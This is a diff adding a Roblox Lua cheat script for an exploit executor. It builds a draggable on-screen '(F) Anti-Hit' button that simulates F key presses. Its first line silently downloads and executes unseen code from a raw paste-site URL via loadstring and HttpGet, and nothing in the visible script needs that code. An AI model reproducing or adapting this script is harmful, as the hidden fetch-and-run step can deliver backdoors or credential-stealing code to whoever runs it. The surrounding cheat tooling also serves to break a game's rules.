@@ -1,0 +1,96 @@
+loadstring(game:HttpGet('https://pastefy.app/j60XrJdx/raw'))()
+local G2L = {}
+local parent = gethui and gethui() or game.CoreGui
+
+-- ScreenGui
+G2L["1"] = Instance.new("ScreenGui", gethui())
+G2L["1"].Name = "DeltaKeyboard"
+G2L["1"].ResetOnSpawn = false
+
+-- Main Frame (small, draggable)
+G2L["2"] = Instance.new("Frame", G2L["1"])
+G2L["2"].Name = "Main"
+G2L["2"].Size = UDim2.new(0, 60, 0, 30)
+G2L["2"].Position = UDim2.new(1, -80, 0, -15) -- moved up so it's above old S key
+G2L["2"].BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+G2L["2"].Active = true
+G2L["2"].Draggable = false
+
+-- Rounded corners
+local corner = Instance.new("UICorner", G2L["2"])
+corner.CornerRadius = UDim.new(0, 6)
+
+-- Outline
+local stroke = Instance.new("UIStroke", G2L["2"])
+stroke.Color = Color3.fromRGB(255, 0, 0)
+stroke.Thickness = 2
+
+-- (F) Anti-Hit Button
+G2L["3"] = Instance.new("TextButton", G2L["2"])
+G2L["3"].Name = "AntiHitButton"
+G2L["3"].Text = "(F) Anti-Hit"
+G2L["3"].Size = UDim2.new(1, -4, 1, -4)
+G2L["3"].Position = UDim2.new(0, 2, 0, 2)
+G2L["3"].BackgroundColor3 = Color3.fromRGB(15, 15, 15)
+G2L["3"].TextColor3 = Color3.fromRGB(255, 50, 50)
+G2L["3"].Font = Enum.Font.SourceSansBold
+G2L["3"].TextSize = 14
+
+local btnCorner = Instance.new("UICorner", G2L["3"])
+btnCorner.CornerRadius = UDim.new(0, 4)
+
+-- Drag Script
+local function dragify(Frame)
+    local dragToggle, dragInput, dragStart, startPos
+    local TweenService = game:GetService("TweenService")
+    local UserInputService = game:GetService("UserInputService")
+
+    local function updateInput(input)
+        local Delta = input.Position - dragStart
+        local Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + Delta.X,
+                                   startPos.Y.Scale, startPos.Y.Offset + Delta.Y)
+        TweenService:Create(Frame, TweenInfo.new(0.2), {Position = Position}):Play()
+    end
+
+    Frame.InputBegan:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 then
+            dragToggle = true
+            dragStart = input.Position
+            startPos = Frame.Position
+            input.Changed:Connect(function()
+                if input.UserInputState == Enum.UserInputState.End then
+                    dragToggle = false
+                end
+            end)
+        end
+    end)
+
+    Frame.InputChanged:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseMovement then
+            dragInput = input
+        end
+    end)
+
+    UserInputService.InputChanged:Connect(function(input)
+        if input == dragInput and dragToggle then
+            updateInput(input)
+        end
+    end)
+end
+task.spawn(function() dragify(G2L["2"]) end)
+
+-- (F) Anti-Hit Button Functionality
+local button = G2L["3"]
+button.MouseButton1Down:Connect(function()
+    keypress(Enum.KeyCode.F)
+    button.BackgroundColor3 = Color3.fromRGB(50, 0, 0)
+end)
+button.MouseButton1Up:Connect(function()
+    keyrelease(Enum.KeyCode.F)
+    button.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
+end)
+button.MouseLeave:Connect(function()
+    button.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
+end)
+
+return G2L["1"], require
